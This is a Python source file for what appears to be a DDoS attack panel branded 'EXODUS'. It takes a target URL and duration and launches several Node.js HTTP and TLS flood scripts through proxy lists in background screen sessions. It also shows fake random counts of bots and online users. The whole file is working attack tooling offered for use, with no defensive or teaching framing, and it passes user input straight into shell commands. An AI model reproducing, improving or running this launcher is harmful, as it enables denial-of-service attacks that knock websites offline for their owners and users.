from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import subprocess
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import codecs

def clear():
    os.system("cls" if os.name == "nt" else "clear")

proxys = open('proxy.txt').readlines()
bots = len(proxys)
online= random.randint(1, 528399)
oonline= random.randint(1, 98)

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")

start_color = (255, 255, 255)
end_color = (0, 0, 255)

uname=input("WHO ARE YOU? : ")

class Color:
    colorama.init()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def layer7():
    print(f"""
                                                                                          
\033[31m𝙊𝙬𝙣𝙚𝙧: 𝙀𝙭𝙤𝙠𝙞𝙚𝙡\033[0m
𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢: https://t.me/phedss
𝙔𝙊 𝙒𝙃𝘼𝙏'𝙎 𝙐𝙋 𝙈𝙔 𝘿𝙐𝘿𝙀? 𝙊𝙍 𝙎𝙃𝙊𝙐𝙇𝘿 𝙄 𝘾𝘼𝙇𝙇 𝙔𝙊𝙐: {uname}?
                                                                                        
            EXAMPLE USAGE:

        𝙈𝙀𝙏𝙃𝙊𝘿   [𝙐𝙍𝙇]   [𝙏𝙄𝙈𝙀]

⠀⠀\033[0m⠀⠀⠀⠀⠀⠀⠀
║EXODUS-BEAM   -- \033[31m𝙊𝙑𝙀𝙍 𝙋𝙊𝙒𝙀𝙍\033[0m \033[31m𝙃𝙏𝙏𝙋 𝙁𝙇𝙊𝙊𝘿\033[0m
║EXODUS-BYPASS -- \033[31m𝘽𝙐𝙍𝙎𝙏 𝙃𝙏𝙏𝙋 𝙒𝙄𝙏𝙃 𝙄𝙉𝘾𝙍𝙀𝘼𝙎𝙀 𝙁𝙇𝙊𝙊𝘿\033[0m
║EXODUS-TLS    -- \033[31m𝙏𝙇𝙎 𝙁𝙇𝙊𝙊𝘿 𝙒𝙄𝙏𝙃 𝙃𝙄𝙂𝙃 𝙍𝙀𝙌 𝙋𝙎\033[0m
║EXODUS-MIX    -- \033[31m𝙁𝙇𝙊𝙊𝘿 𝙒𝙄𝙏𝙃 𝙃𝙄𝙂𝙃 𝙍𝙀𝙌 𝙋𝙎\033[0m
""")

def main():
    os.system("cls" if os.name == "nt" else "clear")
    print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    \033[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⡶⠶⢶⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄⠀
                    ⠀⠉⣷⠀⠀⠀⠀⣠⠟⠁⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠉⢷⡀⠀⠀⠀⣠⡿⠁⠀
                    ⠀⠀⠀⢿⣄⠀⣴⠃⠀⣾⣿⣿⡄⠀⣤⣤⣤⣤⣤⣤⣤⠀⣴⣿⣿⣦⠀⠹⣆⠀⣴⠟⠀⠀⠀
                    ⠀⠀⠀⠀⠙⣶⠃⠀⣿⣿⣿⣿⣿⣦⠀⣿⣿⠿⣿⡟⠀⣾⣿⣿⣿⣿⣷⠀⢹⣾⠁⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⣿⢿⣼⣿⣿⣿⣿⣿⣿⣧⠀⢳⣄⠉⣦⣾⣿⣿⣿⣿⣿⣿⣤⡟⣷⠀⠀⠀⠀⠀\033[0m
                    ▄▄▄ .▐▄• ▄       ·▄▄▄▄  ▄• ▄▌.▄▄ · 
                    ▀▄.▀· █▌█▌▪ ▄█▀▄ ██· ██ █▪██▌▐█ ▀. 
                    ▐▀▀▪▄ ·██· ▐█▌.▐▌▐█▪ ▐█▌█▌▐█▌▄▀▀▀█▄
                    ▐█▄▄▌▪▐█·█▌▐█▌.▐▌██. ██ ▐█▄█▌▐█▄▪▐█
                    ▀▀▀ •▀▀ ▀▀ ▀█▄▀▪▀▀▀▀▀•  ▀▀▀  ▀▀▀▀ 
                    \033[34m⠀⠀⠀⠀⠀⣿⠀⢻⣿⣿⣿⣿⣿⣿⡟⢳⡀⠉⣦⠀⢿⣿⣿⣿⣿⣿⣿⠋⠀⡟⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠹⡆⠀⣿⣿⣿⣿⣿⠋⠀⣿⣿⣶⣿⣷⠀⢻⣿⣿⣿⣿⡿⠀⣼⠁⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⢻⣄⠀⢿⣿⣿⠁⠀⠛⠛⠛⠛⠛⠛⠛⠀⠙⣿⣿⠟⠀⣴⠋⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠉⣶⡀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠁⣠⡾⠁⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣤⣈⢿⡍⠙⠛⠛⠛⠉⣩⡟⣀⣴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⠒⠒⠚⣿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣷⣠⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[0m
""")
    print("""                   \033[31m𝙔𝙊𝙐 𝙎𝙃𝙊𝙐𝙇𝘿𝙉𝙏 𝙎𝙋𝘼𝙈 𝘼𝙏𝙏𝘼𝘾𝙆 𝙐𝙉𝘿𝙀𝙍𝙎𝙏𝙊𝙊𝘿?
                       𝙊𝙍 𝙀𝙇𝙎𝙀 𝙔𝙊𝙐 𝙈𝙄𝙂𝙃𝙏 𝙂𝙀𝙏 𝘽𝘼𝙉𝙉𝙀𝘿
                        𝙏𝙔𝙋𝙀 [𝙃𝙀𝙇𝙋] 𝙏𝙊 𝙎𝙀𝙀 𝙏𝙃𝙀 𝙈𝙀𝙉𝙐\033[0m""")


    while True:
        sys.stdout.write(f"\x1b]2;[ {uname}-EXODUS : Online Users: {oonline} : Bots: [{online}] : Expired: [∞]\x07 ")
        sin = input(f"{uname}\033[31m@\033[0m𝙀𝙓𝙊𝘿𝙐𝙎:  ")
        sinput = sin.split(" ")[0]
        if sinput.lower() in ["clear", "cls"]:
            os.system("clear")
            main()
        elif "stop" in sin:
            try:
                subprocess.run(['pkill screen'], shell=True)
                subprocess.run(['pkill screen'], shell=True)
                subprocess.run(['pkill screen'], shell=True)
                print(f" \033[36m𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋𝙋𝙀𝘿 [!]")
            except IndexError:
                print('stop')
        if sinput == "help" or sinput == "l7":
            os.system ("clear")
            layer7()
        elif sinput == "tls":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node dildoser1.js {url} {time} 5 512 proxy.txt 1')
                os.system(f'cd l7 && screen -dm node dildoser.js {url} {time} 5 512 proxy1.txt 1')
                os.system(f'cd l7 && screen -dm node lmao.js {url} {time} 20 512 proxy12.txt -h user-agent@test_ua -h accept@*/*')
                os.system(f'cd l7 && screen -dm node lmao1.js {url} {time} 20 512 proxy11.txt -h user-agent@test_ua -h accept@*/*')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 10')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 10')
                print(f"""\033[90m
𝘼𝙩𝙩𝙖𝙘𝙠 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩𝙚𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙀𝙭𝙤𝙙𝙪𝙨 𝘽𝙤𝙩𝙨!!!\033[0m
""")
            except ValueError:
                layer7()
            except IndexError:
                print("\033[36mExample Usage: tls [URL] [TIME]")
        elif sinput == "beam":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node shunga1.js {url} {time} 512 10 proxy1.txt')
                os.system(f'cd l7 && screen -dm node shunga.js {url} {time} 512 10 proxy.txt')
                os.system(f'cd l7 && screen -dm node dildoser1.js {url} {time} 10 512 proxy3.txt 1')
                os.system(f'cd l7 && screen -dm node lmao.js {url} {time} 20 512 proxy12.txt -h user-agent@test_ua -h accept@*/*')
                os.system(f'cd l7 && screen -dm node lmao1.js {url} {time} 20 512 proxy11.txt -h user-agent@test_ua -h accept@*/*')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 10')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 10')
                print(f"""\033[90m
𝘼𝙩𝙩𝙖𝙘𝙠 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩𝙚𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙀𝙭𝙤𝙙𝙪𝙨 𝘽𝙤𝙩𝙨!!!\033[0m
""")
            except ValueError:
                layer7()
            except IndexError:
                print("\033[36mExample Usage: beam [URL] [TIME]")
        elif sinput == "bypass":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node ddoser.js {url} {time} 512 10')
                os.system(f'cd l7 && screen -dm node shunga.js {url} {time} 512 10 proxy1.txt')
                os.system(f'cd l7 && screen -dm node dildoser1.js {url} {time} 10 512 proxy.txt 1')
                os.system(f'cd l7 && screen -dm node dildoser.js {url} {time} 10 512 proxy2.txt 1')
                os.system(f'cd l7 && screen -dm node lmao.js {url} {time} 20 512 proxy12.txt -h user-agent@test_ua -h accept@*/*')
                os.system(f'cd l7 && screen -dm node lmao1.js {url} {time} 20 512 proxy11.txt -h user-agent@test_ua -h accept@*/*')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 10')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 10')
                print(f"""\033[90m
𝘼𝙩𝙩𝙖𝙘𝙠 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩𝙚𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙀𝙭𝙤𝙙𝙪𝙨 𝘽𝙤𝙩𝙨!!!\033[0m
""")
            except ValueError:
                layer7()
            except IndexError:
                print("\033[36mExample Usage: bypass [URL] [TIME]")
        elif sinput == "mix":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node lmao.js {url} {time} 20 512 proxy12.txt -h user-agent@test_ua -h accept@*/*')
                os.system(f'cd l7 && screen -dm node lmao1.js {url} {time} 20 512 proxy11.txt -h user-agent@test_ua -h accept@*/*')
                os.system(f'cd l7 && screen -dm node dildoser1.js {url} {time} 10 512 proxy.txt 1')
                os.system(f'cd l7 && screen -dm node dildoser.js {url} {time} 10 512 proxy2.txt 1')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 10')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 10')
                print(f"""\033[90m
𝘼𝙩𝙩𝙖𝙘𝙠 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩𝙚𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙀𝙭𝙤𝙙𝙪𝙨 𝘽𝙤𝙩𝙨!!!\033[0m
""")
            except ValueError:
                layer7()
            except IndexError:
                print("\033[36mExample Usage: mix [URL] [TIME]")
main()